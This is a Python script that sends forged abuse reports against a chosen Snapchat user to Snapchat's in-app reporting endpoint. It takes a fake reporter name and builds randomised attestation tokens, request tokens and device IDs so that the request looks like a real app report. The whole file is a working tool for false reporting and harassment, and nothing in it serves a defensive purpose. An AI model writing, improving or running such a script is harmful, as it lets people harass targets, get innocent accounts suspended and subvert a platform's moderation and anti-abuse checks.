#!/usr/bin/python3
import requests, json, datetime, random, time
#
session = requests.session()
t3 = ''.join((random.choice('0123456789') for i in range(3)))
URL_REPORT_HR = "https://app.snapchat.com/reporting/inapp/v1/user"
userAgen = "CronetSnapDevShe1do/1"
rurtcoa = "report_user_reason_theyre_creepy_or_annoying"
# 2 Random those 
curr_time = time.time()
tarG3t = input("[ 1 ] Enter Target UserName : ")
reByUserFake = input("[ 2 ] Enter Fake Username as Reporter : ")
XSnapchatAtt = input("[ 3 ] Enter X-SnapChat-Att or enter to random : ") or f"Cgs{t3}AAFQ{t3}a8IChLgAuCZRq9IQFJmeZ5dPBsZ09tQIBVOVxaWpfBzbhIt4_oHTjtKjUzdyW_lZMVLrV5PQ9wmHtdOFnNMu2qrDgcX503SVmCcMuYB43i3nY6rrdIITX43bsbm-NyknUkmYxvg_GubZqh7gPgnJlpiu2934RlwWw8LPw75nJKx7aCXJIKox6clsrTDWZJ_yz8oeWX1keFx7htmxy0QopGfO4_O_Q2YRzcYtHf24kfWaWdEYUhKOeIy1hwrjpCe_-IRs833gCjJ7h_RQjtZD0-FLYbg7DooBYiRblwP856vausoqeLKtpX9tDXIsNRkGwNBkdJErhn-P2SCgycujtYXVn7wmPvHNltj33nmxLKKyNnJZ3Vf6N-RJNdz3b2g3QmMFMoWuKEYW5g0IJ2-PTtk17_Hu-oSMDyGQTzNP6hEz7SkU-gnr77MontIPsYm-vamJwIapFio4R_S590frq0LNcodR0U="
req_t0k3n = f"f{t3}b66f{t3}*/b{t3}d0d9bf4{t3}6f09{t3}a8b7e{t3}d325{t3}0bdc{t3}9654{t3}574"
XSnapChatUuid = f"A{t3}4{t3}-{t3}8-4{t3}-{t3}A-{t3}13E98A{t3}"
AccepLocal = "ar_SA"
#----------------------------------------------#
headers = {
      'Host': 'app.snapchat.com',
      'X-Snapchat-Uuid': f'{XSnapChatUuid}',
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'Accept': '*/*',
      'Accept-Locale': f'{AccepLocal}@numbers=latn',
      'Content-Length': '221',
      'X-Snapchat-Att': f'{XSnapchatAtt}',
      'User-Agent': f'{userAgen}',
      'Accept-Language': f'{AccepLocal};q=1, {AccepLocal};q=0.9',
      'Accept-Encoding': 'gzip, deflate'
      }
resp=session.post(f'{URL_REPORT_HR}', headers=headers, data=f'context=&friend_link_type=-1&reason_id={rurtcoa}&reported={tarG3t}&req_token={req_t0k3n}&timestamp={curr_time}&username={reByUserFake}')
if resp.status_code == 200:
    print ('OK!')
else:
    print ('403! check your X-Snapchat-Att')


